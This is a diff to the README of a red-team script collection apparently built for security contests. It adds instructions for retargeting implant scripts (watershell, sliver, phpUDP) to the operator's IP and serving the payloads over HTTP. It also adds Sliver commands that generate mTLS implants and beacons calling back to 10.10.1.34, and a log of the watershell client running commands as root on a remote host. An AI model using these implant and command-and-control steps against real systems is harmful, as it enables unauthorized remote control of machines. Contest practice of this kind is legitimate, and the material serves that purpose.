@@ -1,6 +1,10 @@
 A collection of scripts that would be useful in during certain security contests.
 
-!! Make sure to change the IP in Beachhead/watershell.sh to your IP as well as run `python3 -m http.server 80` while in the UnnamedSecurityContest root
+!! Make sure to change the IP in Beachhead/watershell.sh to your IP if you dont want it going to a team server as well as run `python3 -m http.server 80` while in the UnnamedSecurityContest root
+
+!! Make sure to alos change the IP in Beachhed/sliver.sh to be your IP if you dont want it going to a team server. You will also need to put a payload in Beachhead_source/sliverPayloads.
+
+!! Change the ip on phpUDP as well
 
 The Private SSH key loaded will be distributed through another channel.
 
@@ -32,4 +36,15 @@ The Private SSH key loaded will be distributed through another channel.
   * attack_master.py Loops through a file executing each command
   * a list of commands to be executed.  likely calling attack_linux...
 
+!! Sliver Commands
+  * `generate --mtls 10.10.1.34 --save /root/UnnamedSecurityContest/Beachhead_source/sliverPayloads/ --os linux`
+  * `generate beacon --mtls 10.10.1.34 --save /root/UnnamedSecurityContest/Beachhead_source/sliverPayloads/ --os linux`
 
+!! Watershell Commands
+  * ```
+  ┌──(root㉿dragon)-[~/UnnamedSecurityContest/Beachhead_source/watershell-tcp]
+  └─# python3 watershell-cli.py -t 10.10.1.36 -p 1337 -c id
+  Connecting to Watershell on ('10.10.1.36', 1337)...
+  Connected!
+  uid=0(root) gid=0(root) groups=0(root)
+  ```
